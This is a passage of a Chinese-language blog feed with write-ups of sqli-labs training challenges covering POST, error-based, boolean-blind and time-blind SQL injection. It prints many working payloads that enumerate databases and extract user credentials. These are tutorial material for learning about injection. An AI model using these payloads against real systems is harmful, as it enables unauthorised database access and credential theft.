    <summary type="html">&lt;h1 id=&quot;Less-23-基于错误的，过滤注释的GET型&quot;&gt;&lt;a href=&quot;#Less-23-基于错误的，过滤注释的GET型&quot; class=&quot;headerlink&quot; title=&quot;Less-23  基于错误的，过滤注释的GET型&quot;&gt;&lt;/a&gt;Less-23  基于错误的，过</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql-11，12</title>
    <link href="http://example.com/2021/01/24/sql-11/"/>
    <id>http://example.com/2021/01/24/sql-11/</id>
    <published>2021-01-24T09:01:50.000Z</published>
    <updated>2021-01-24T09:24:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>接下来的是post型注入</p><h1 id="Get与post的区别"><a href="#Get与post的区别" class="headerlink" title="Get与post的区别"></a>Get与post的区别</h1><p><strong>1.</strong> get是从服务器上获取数据，post是向服务器传送数据。</p><p><strong>2</strong>. GET请求把参数包含在URL中，将请求信息放在URL后面，POST请求通过request body传递参数，将请求信息放置在报文体中。</p><p><strong>3.</strong> get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。</p><p><strong>4.</strong> get安全性非常低，get设计成传输数据，一般都在地址栏里面可以看到，post安全性较高，post传递数据比较隐私，所以在地址栏看不到， 如果没有加密，他们安全级别都是一样的，随便一个<a href="https://www.baidu.com/s?wd=%E7%9B%91%E5%90%AC%E5%99%A8&tn=24004469_oem_dg&rsv_dl=gh_pl_sl_csd">监听器</a>都可以把所有的数据监听到。</p><p><strong>5.</strong> GET请求能够被缓存，GET请求会保存在浏览器的浏览记录中，以GET请求的URL能够保存为浏览器书签，post请求不具有这些功能。</p><p><strong>6.</strong> HTTP的底层是TCP/IP，GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接。GET和POST能做的事情是一样一样的。你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。</p><p>**7.**GET产生一个TCP数据包，对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；POST产生两个TCP数据包，对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据），并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</p><h1 id="Less-11-POST-基于错误的-单引号-字符型"><a href="#Less-11-POST-基于错误的-单引号-字符型" class="headerlink" title="Less-11   POST - 基于错误的- 单引号 - 字符型"></a>Less-11   POST - 基于错误的- 单引号 - 字符型</h1><p>源代码</p><p><img src="https://img-blog.csdnimg.cn/20200402224244143.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200402224337252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="我们可以Hackbar插件中输入语句，这样好改注入语句"><a href="#我们可以Hackbar插件中输入语句，这样好改注入语句" class="headerlink" title="我们可以Hackbar插件中输入语句，这样好改注入语句"></a>我们可以Hackbar插件中输入语句，这样好改注入语句</h3><h3 id="知道了是字符型单引号注入，那么测试一下是不是注入点："><a href="#知道了是字符型单引号注入，那么测试一下是不是注入点：" class="headerlink" title="知道了是字符型单引号注入，那么测试一下是不是注入点："></a>知道了是字符型单引号注入，那么测试一下是不是注入点：</h3><p>1’ or 1=1 – #</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcQzKo4PmYZsYkY.TJc4H3xqep0M9JgTJ*qC.aQxPD16CV0IDp*vgqr7D1c.u6WM2LAl5S5m.*D2RY3Ms2U*MwvM!/b&bo=PALPAAAAAAADF8M!&rf=viewer_4" alt="img"></p><p>成功登陆，说明这就是一个注入点，后台形成的 sql 语句为<br>@$sql=”SELECT username, password FROM users WHERE username=’1’ or 1=1 – # and password=’$passwd’ LIMIT 0,1”;<br>在#以后的内容就被注释掉，前面的内容因为 or 1=1 恒成立，所以语句就成立，登录成功。</p><h3 id="4-接下来就是获取字段数，我们知道Less1-4中通过-？id-数据-order-by-n-–-返回的信息猜解出字段数n-3-但他的前提是这个-“数据”是true才行，而我们这里用-1’-order-by-n-–-肯定不行的，因为该数据库中根本就没有用户名为1的用户啊，除非你知道有Dum用户，然后-Dumb’-order-by-n-–-得出n-2-那如何解决，逆向思维，直接利用union联合注入，让你前一个条件为false，然后直接执行后面的select语句，构造payload-1’-union-select-1-2–-结果返回用户名和密码说明字段数为2"><a href="#4-接下来就是获取字段数，我们知道Less1-4中通过-？id-数据-order-by-n-–-返回的信息猜解出字段数n-3-但他的前提是这个-“数据”是true才行，而我们这里用-1’-order-by-n-–-肯定不行的，因为该数据库中根本就没有用户名为1的用户啊，除非你知道有Dum用户，然后-Dumb’-order-by-n-–-得出n-2-那如何解决，逆向思维，直接利用union联合注入，让你前一个条件为false，然后直接执行后面的select语句，构造payload-1’-union-select-1-2–-结果返回用户名和密码说明字段数为2" class="headerlink" title="4.接下来就是获取字段数，我们知道Less1-4中通过 ？id=数据 order by n – # 返回的信息猜解出字段数n=3,但他的前提是这个 “数据”是true才行，而我们这里用 1’ order by n – #肯定不行的，因为该数据库中根本就没有用户名为1的用户啊，除非你知道有Dum用户，然后 Dumb’ order by n – #得出n=2,那如何解决，逆向思维，直接利用union联合注入，让你前一个条件为false，然后直接执行后面的select语句，构造payload: -1’ union select 1,2– # 结果返回用户名和密码说明字段数为2"></a>4.接下来就是获取字段数，我们知道Less1-4中通过 ？id=数据 order by n – # 返回的信息猜解出字段数n=3,但他的前提是这个 “数据”是true才行，而我们这里用 1’ order by n – #肯定不行的，因为该数据库中根本就没有用户名为1的用户啊，除非你知道有Dum用户，然后 Dumb’ order by n – #得出n=2,那如何解决，逆向思维，直接利用union联合注入，让你前一个条件为false，然后直接执行后面的select语句，构造payload: -1’ union select 1,2– # 结果返回用户名和密码说明字段数为2</h3><h3 id="5-字段数知道了，那么直接爆数据库—-得到security数据库："><a href="#5-字段数知道了，那么直接爆数据库—-得到security数据库：" class="headerlink" title="5.字段数知道了，那么直接爆数据库—-得到security数据库："></a>5.字段数知道了，那么直接爆数据库—-得到security数据库：</h3><p>爆当前数据库：</p><p>uname=-1’ union select 1,database()– #&amp;passwd=1</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5jlwr3XRTlLVwTGrPqgVFC*hlq7btNN41NL2*avhcZsiIBVvSTz44KLFtty1skFnrjPE4jCRmPDrDS6BWlgMufA!/b&bo=tgWjAwAAAAADBzE!&rf=viewer_4" alt="img"></p><p>爆所有的数据库：</p><p>uname=-1’ union select 1,group_concat(schema_name) from information_schema.schemata– #&amp;passwd=1</p><h3 id="6-爆数据表—-得到我们需要的users表"><a href="#6-爆数据表—-得到我们需要的users表" class="headerlink" title="6.爆数据表—-得到我们需要的users表"></a>6.爆数据表—-得到我们需要的users表</h3><p>uname=-1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()– #&amp;passwd=1</p><h3 id="7-爆users表的字段（列）"><a href="#7-爆users表的字段（列）" class="headerlink" title="7.爆users表的字段（列）"></a>7.爆users表的字段（列）</h3><p>uname=1&amp;passwd=-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=database()– #</p><h3 id="8-爆users表的数据："><a href="#8-爆users表的数据：" class="headerlink" title="8.爆users表的数据："></a>8.爆users表的数据：</h3><p>uname=1&amp;passwd=-1’ union select group_concat(username),group_concat(password) from users– #</p><h1 id="Less-12-基于错误的双引号POST型字符型变形的注入"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="Less-12   基于错误的双引号POST型字符型变形的注入"></a>Less-12   基于错误的双引号POST型字符型变形的注入</h1><p>由题意可知，这道题有双引号闭合的问题，于是分别在输入框输入 1” 和 1，查看报错信息：</p><p><img src="https://img-blog.csdnimg.cn/20200405215319384.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200405215408100.png" alt="img"></p><p>报错信息出现了一个小括号，说明这是带一个括号的双引号注入</p><p>那么同理，我们只需把Less-11操作中的  ‘ 换成  “)  其余操作不变；</p><h2 id="利用extractvalue-函数进行报错注入："><a href="#利用extractvalue-函数进行报错注入：" class="headerlink" title="利用extractvalue()函数进行报错注入："></a>利用extractvalue()函数进行报错注入：</h2><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p>uname=1” and extractvalue(1,concat(0x7e,(select database())))  and “ &amp;passwd=1</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcUO9ZRemArWd3DuY6FZznYOF8kTJo39zPDSqHOLDY1k4plmaC*xBRb7DxfG7g4hXlbLPduatnXM8Bs4*QZ9bOaU!/b&bo=RQQmAgAAAAADJ2c!&rf=viewer_4" alt="img"></p><h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><p>uname=1” and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and “ &amp;passwd=1</p><h3 id="爆列名："><a href="#爆列名：" class="headerlink" title="爆列名："></a>爆列名：</h3><p>uname=1” and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’))) and “ &amp;passwd=1</p><h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>uname=1” and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) and “ &amp;passwd=1</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;接下来的是post型注入&lt;/p&gt;
&lt;h1 id=&quot;Get与post的区别&quot;&gt;&lt;a href=&quot;#Get与post的区别&quot; class=&quot;headerlink&quot; title=&quot;Get与post的区别&quot;&gt;&lt;/a&gt;Get与post的区别&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;1.&lt;/st</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql-9</title>
    <link href="http://example.com/2021/01/20/sql-9/"/>
    <id>http://example.com/2021/01/20/sql-9/</id>
    <published>2021-01-20T06:20:04.000Z</published>
    <updated>2021-01-20T08:25:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-9-时间盲注"><a href="#Less-9-时间盲注" class="headerlink" title="Less-9  时间盲注"></a>Less-9  时间盲注</h1><p>从题目中我们了解到了这是一道关于单引号时间盲注的题，那么我们先尝试 ?id=1’ 发现返回的结果竟然是 You are in …  什么情况？于是分别尝试 ?id=1  ?id=1”  发现结果都是You are in … 于是可以大胆的猜测正确的输入和错误的输入返回的结果被设置成一样的了。</p><h3 id="对比后台源码："><a href="#对比后台源码：" class="headerlink" title="对比后台源码："></a>对比后台源码：</h3><p><img src="https://img-blog.csdnimg.cn/20200331210910911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><p>从源代码中证明了我们的猜测，由此也可得出这样的结论：1.不返回报错信息页面，无法进行基于报错信息的盲注。2.页面不存在true和false两种不同的页面，无法进行对比也就无法进行布尔盲注。</p><p><strong>一般来说，在页面没有任何回显和错误信息提示的时候，我们就会测试时间盲注这最后的手法。</strong></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5ufTykfbn7FOaVBaKHOo.TV69lpaeyq*RqfHjMJGgTNWM*zRa5Bb4Bg.eXDp9zvQRSfaZBn0jLJNEOW69smTghA!/b&bo=EgWVAwAAAAADB6M!&rf=viewer_4" alt="img"></p><p>发现只有语句页面延迟了，说明这是单引号时间盲注。<br>常用的判断语句:<br>‘ and if(1,sleep(5),1) %23</p><p>‘ and if(1=0,1,sleep(10)) –+</p><p>“ and if(1=0,1, sleep(10)) –+</p><p>) and if(1=0,1, sleep(10)) –+</p><p>‘) and if(1=0,1, sleep(10)) –+</p><p>“) and if(1=0,1, sleep(10)) –+</p><p>………..</p><h3 id="补充小知识："><a href="#补充小知识：" class="headerlink" title="补充小知识："></a>补充小知识：</h3><p>使用<br>if(查询语句,1,sleep(5))<br>即如果我们的查询语句为真，那么直接返回结果；如果我们的查询语句为假，那么过5秒之后返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确。<br>1.if(expr1,expr2,expr3) :判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句<br>2.sleep(n) ：将程序挂起一段时间 n单位为秒</p><h3 id="1-然后我们就来猜数据库长度："><a href="#1-然后我们就来猜数据库长度：" class="headerlink" title="1.然后我们就来猜数据库长度："></a>1.然后我们就来猜数据库长度：</h3><p>?id=1’ and if (length(database())=x ,sleep(5),1)–+</p><p>　　　　x从4开始增加，增加到8有明显的延迟，说明数据库的长度是8；</p><p>?id=1’ and if(length(database())=8,sleep(5),1) – #</p><h3 id="2-猜数据库名—-gt-得到security-数据库："><a href="#2-猜数据库名—-gt-得到security-数据库：" class="headerlink" title="2.猜数据库名—&gt; 得到security 数据库："></a>2.猜数据库名—&gt; 得到security 数据库：</h3><p>当前的数据库名：可以用 &lt;  &gt;  = 比较，对字符进行范围的判断，不断缩小范围</p><p>?id=1’ and if(left(database(),1)&gt;’r’ ,sleep(5),1)– #           页面有明显延迟</p><p>?id=1’ and if(left(database(),1)&gt;’s’ ,sleep(5),1)– #          页面无明显延迟</p><p>?id=1’ and if(left(database(),1)&gt;’t’ ,sleep(5),1)– #          页面无明显延迟</p><p>?id=1’ and if(left(database(),1)=’s’ ,sleep(5),1)– #          页面有明显延迟</p><p>……..<br>?id=1’ and if(left(database(),8)=’security’ ,sleep(5),1)– #          页面有明显延迟</p><p>当然也可以这样写：<br>正确的时候直接返回，不正确的时候等待 5 秒钟，只给出正确的：<br>?id=1’ and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+<br>说明第一位是 s （ascii 码是 115）<br>?id=1’ and If(ascii(substr(database(),2,1))=101,1,sleep(5))–+<br>说明第一位是 e （ascii 码是 101）<br>….<br>以此类推，我们知道了数据库名字是 security</p><h3 id="3-猜数据库表"><a href="#3-猜数据库表" class="headerlink" title="3.猜数据库表"></a>3.猜数据库表</h3><p>?id=1’ and if(left((select table_name from information_schema.tables where table_schema=database() limit x,1),5)=’users’,sleep(5),1)–+</p><p><img src="/2021/01/20/sql-9/Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210120162541682.png" alt="image-20210120162541682"></p><p>通过limit x,1 中x的变化，我们找到了users表</p><p>?id=1’ and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=’users’,sleep(5),1)–+</p><p>注意不建议使用这种方法猜数据库里的表，这种猜数据库表的概率太低，这种写法只能说你知道了security数据库可能有 users 表但你不确定，用这种语句可以确定数据库是否有该表，且该表在第几行，由下图可知，users表在第四行，而limit是从0开始的，所以x为3</p><p><img src="https://img-blog.csdnimg.cn/20200331225342637.png" alt="img"></p><p>既然上面的不靠谱，那么用另外一种方法吧：<br>正确的时候直接返回，不正确的时候等待 5 秒钟，只给出正确的：(注意拼写正确)</p><p>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+</p><p>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),2,1))=109,1,sleep(5))–+</p><p>…..<br>猜测第一个数据表的第一位是 e,…依次类推，得到 emails<br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1))=114,1,sleep(5))–+</p><p>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),2,1))=101,1,sleep(5))–+</p><p>…….<br>猜测第二个数据表的第一位是 r,…依次类推，得到 referers<br>……<br>再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users</p><h3 id="4-猜users表里的列-（ASCII码-i-105）"><a href="#4-猜users表里的列-（ASCII码-i-105）" class="headerlink" title="4.猜users表里的列 （ASCII码 i-105）"></a>4.猜users表里的列 （ASCII码 i-105）</h3><p>?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=’users’ and table_schema=database() limit 0,1),1,1))=105,1,sleep(5))–+<br>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是 id，username，password</p><p>（and table_schema=database()这条语句不能少是因为要排除其他数据库可能也会有users表）</p><h3 id="5-猜username的值（ASCII码-D-68）"><a href="#5-猜username的值（ASCII码-D-68）" class="headerlink" title="5.猜username的值（ASCII码 D=68）"></a>5.猜username的值（ASCII码 D=68）</h3><p>?id=1’ and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+<br>猜测 username 的第一行的第一位<br>以此类推，我们得到数据库 username，password 的所有内容</p><h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><p>if(查询语句,1,sleep(5))里面的查询<br>语句都可以换成布尔盲注的语句，参考less-5，同理Less-5的语句也能换成less-9的查询语句，就是布尔盲注与延时注入相结合，要灵活运用。</p><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>从题目中我们可以得出这是一道关于双引号时间盲注的题，也就是和Less-9十分类似，只需把单引号 ‘  替换成双引号 “ 其他操作不变。<br>查看下源码：</p><p><img src="https://img-blog.csdnimg.cn/20200401205928400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><p>发现是双引号；</p><p>过程与第九关一样。</p><p>over</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Less-9-时间盲注&quot;&gt;&lt;a href=&quot;#Less-9-时间盲注&quot; class=&quot;headerlink&quot; title=&quot;Less-9  时间盲注&quot;&gt;&lt;/a&gt;Less-9  时间盲注&lt;/h1&gt;&lt;p&gt;从题目中我们了解到了这是一道关于单引号时间盲注的题，那么我们先尝</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sqllabs-Less5，6，8</title>
    <link href="http://example.com/2020/12/20/sql-5/"/>
    <id>http://example.com/2020/12/20/sql-5/</id>
    <published>2020-12-20T05:30:44.000Z</published>
    <updated>2021-02-04T07:25:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>正确的思路是盲注。从源代码中可以看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了(但会print_f(mysql_error())，这点很重要)，所以我们不能利用前面 less1-4 的方法。</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5oesWiKujP3BwLjltbe1c8bcBOfwHsFrb8rF1wsVhZNLQG.36Y8KZh6semKW7SLx7obVw5Kq2rLof7STS.sr5zM!/b&bo=7gO9AgAAAAADB3A!&rf=viewer_4" alt="img"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYsxACdR6tCVgLBHc6efH4Sy1KypKJpPLO5*sp44NOquuVyVRTBYJuxsPKvhM*OkEGMg!/b&bo=rwbyAgAAAAADN0s!&rf=viewer_4" alt="img"></p><p>发现sql语句有错误，这里就想到报错注入</p><p>什么是报错注入呢？</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。0x7e=’~’</p><p>首先介绍三种报错注入常用的语句： (1). 通过floor报错 and (select 1 from (select<br>count(*),concat(( payload),floor (rand(0)*2))x from<br>information_schema.tables group by x)a) 其中payload为你要插入的SQL语句<br>需要注意的是该语句将 输出字符长度限制为64个字符</p><p>(2). 通过updatexml报错 and updatexml(1, payload,1)<br>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p><p>(3). 通过ExtractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。<br>这些是我参考大佬的博客所得到的</p><h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><p>?id=1’ and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor (rand()*2)) as x from information_schema.tables group by x) as a) –+</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYsyy*Q7GpOWP*esLON54spX7cerxiSeJVG3Fj4KbgJetkPIsFkvpguvq1DF8rkCxnac!/b&bo=QQfNAgAAAAADN5s!&rf=viewer_4" alt="img"></p><p>提示说输出信息超过一行，说明这里数据库名组成的字符串长度超过了64位(group_concat()函数最大长度为64位)—-但是我测试了一下最多可以有70多位，要用limit 来一个个输出<br>1、limit 0,1<br>?id=1’ and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) –+<br>查出了名为information_schema的数据库</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYswXoqJjJY.h3AAjrikyJ2O78xIqohsD01TM30J8H1EYxZIqpbxVadc.kPbe6703rEg!/b&bo=TwfeAgAAAAADN4Y!&rf=viewer_4" alt="img"></p><p><strong>2、limit 1,1</strong><br>?id=1’ and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 1,1),floor (rand()<em>2)) as x from information_schema.tables group by x) as a) –+`<br>查出了名为</em></em>challenges**的数据库</p><p><strong>3、limit 2,1</strong><br>?id=1’ and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 2,1),floor (rand()<em>2)) as x from information_schema.tables group by x) as a) –+`<br>查出来名为</em></em>mysql**的数据库</p><p><strong>4、limit 3,1</strong><br>?id=1’ and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 3,1),floor (rand()<em>2)) as x from information_schema.tables group by x) as a) –+`<br>查出来名为</em></em>performance_schema**的数据库</p><p><strong>5、limit 4,1</strong><br>?id=1’ and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 4,1),floor (rand()<em>2)) as x from information_schema.tables group by x) as a) –+`<br>查出来名为</em></em>security**的数据库<br>然后是limit 5,1 ，是名为test的数据库</p><p>直到limit 6,1，不报错.说明只有6条数据库</p><h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><p>这里利用<strong>security</strong>库，在<strong>limit 3,1</strong>里找到了<strong>users</strong>表</p><p>?id=1’ and (select 1 from (select count(*),concat(((select concat(table_name) from information_schema.tables where table_schema=’security’ limit 3,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) –+</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYsyy*Q7GpOWP*esLON54spX7cerxiSeJVG3Fj4KbgJetkPIsFkvpguvq1DF8rkCxnac!/b&bo=QQfNAgAAAAADN5s!&rf=viewer_4" alt="img"></p><h4 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h4><p>下面查询users表里的字段<br>limit 0,1 是id<br>?id=1’ and (select 1 from (select count(*),concat((select concat(column_name,’;’) from information_schema.columns where table_name=’users’ limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) –+</p><p>limit 1,1 是username</p><p>?id=1’ and (select 1 from (select count(*),concat((select concat(column_name,’;’) from information_schema.columns where table_name=’users’ limit 1,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) –+</p><p>limit 2,1 是password</p><p>?id=1’ and (select 1 from (select count(*),concat((select concat(column_name,’;’) from information_schema.columns where table_name=’users’ limit 2,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) –+</p><h4 id="查询username、password字段的值"><a href="#查询username、password字段的值" class="headerlink" title="查询username、password字段的值"></a>查询username、password字段的值</h4><p>同样 limit 0,1<br>?id=1’ and(select 1 from (select count(*),concat((select concat(username,’: ‘,password,’;’) from security.users limit 0,1),floor(rand()*2)) as x from security.users group by x) as a)–+</p><p>limit 1,1<br>?id=1’ and(select 1 from (select count(*),concat((select concat(username,’: ‘,password,’;’) from security.users limit 1,1),floor(rand()*2)) as x from security.users group by x) as a)–+`</p><p>…….</p><p>依次输出；</p><h3 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h3><p>UpdateXML(xml_target, xpath_expr, new_xml)</p><p><strong>xml_target:：</strong> 需要操作的xml片段</p><p><strong>xpath_expr：</strong> 需要更新的xml路径(Xpath格式)</p><p><strong>new_xml：</strong> 更新后的内容</p><p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <em>xml_target</em> 新的XML片段 <em>new_xml</em> ，然后返回更改的XML。<em>xml_target</em>替换的部分 与<em>xpath_expr</em> 用户提供的XPath表达式匹配。</p><p>爆数据库</p><p>?id=1’ or updatexml(1,concat(0x7e,database(),0x7e),1)–+</p><p>爆表名</p><p>?id=1’ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),0x7e),1)–+</p><p>爆字段</p><p>?id=1’ or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),0x7e),1)–+</p><p>爆字段的值</p><p>?id=1’ or updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)–+</p><h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><p>ExtractValue(xml_frag, xpath_expr)</p><p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p><p>爆数据库<br>?id=1’  and extractvalue(1,concat(0x7e,database(),0x7e))–+<br>爆表名<br>?id=1’ and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x23))–+<br>爆列名（字段）<br>?id=1’ and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 1,1),0x23))–+<br>爆值<br>?id=1’ and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))–+<br>这里也需要不断改变limit的条件，找到我们想要的表名，字段名！</p><h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>观察到如果正确，就输出you are in……；如果不正确，就不输出。<br>如id=3，有这个值，所以输出了you are in。id=-3，是错误的，所以输出了空白<br>因此可以根据这个现象来推测。</p><p>?id=3’ and length(database())=7–+<br>‘ 的作用，是闭合。length(database())是得到数据库的字符串长度。<br>字符串长度不是7，报错。<br><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5iK1LfZHtBibppwAzKxkanK10fruAIqsN3KNOvsbFinub5XsXUzjpMXQt7CIGS2UcrcZxMBS.6FDPecMBZQdgKA!/b&bo=aQZTAwAAAAADBx0!&rf=viewer_4" alt="img"></p><p>字符串长度等于8，没报错了</p><p>说明字符串的长度是8。即数据库的名字有8个字符。</p><p>?id=3’ and ascii(substr(database(),1,1))&gt;115–+</p><ol><li><p>substr(var1, var2, var3)</p><p>功能：从字符串里截取其中一段字符（串）</p><ul><li>var1：被截取的字符串</li><li>var2：从哪一位开始截取</li><li>var3：截取长度</li></ul></li><li><p>ascii(var)</p><p>功能：取var字符的ascii码（十进制）</p></li></ol><p><img src="https://img-blog.csdnimg.cn/20200727193113387.png" alt="在这里插入图片描述"></p><p>数据库的第一位字符的ASCII码值大于114，不大于115，所以是115。<br>查表可知115对应的字符是s,即第一位是s</p><p>100正常，101报错， 对应的是e</p><p>?id=3’ and ascii(substr(database(),2,1))&gt;100–+<br>98正常，99报错， 对应的是c</p><p>?id=3’ and ascii(substr(database(),3,1))&gt;98–+<br>……<br>120正常，121报错， 对应的是y</p><p>?id=3’ and ascii(substr(database(),8,1))&gt;120–+<br>得出数据库的名字是：security</p><p>知道了库名，就是表名了：</p><p>100正常，101报错， 对应的是e</p><p>?id=3’  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=’security’),1,1))&gt;100–+<br>108正常，109报错，对应的是m</p><p>?id=3’  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=’security’),2,1))&gt;108–+<br>emails<br>利用limit来输出其他的表名</p><p>……<br>就这样，得出表名，列名及字段（参考报错注入）</p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>第六关原理和第五关一样，就是第六关是双引号，解法同上</p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>第八关也是一样的</p>]]></content>
    
    
      
      
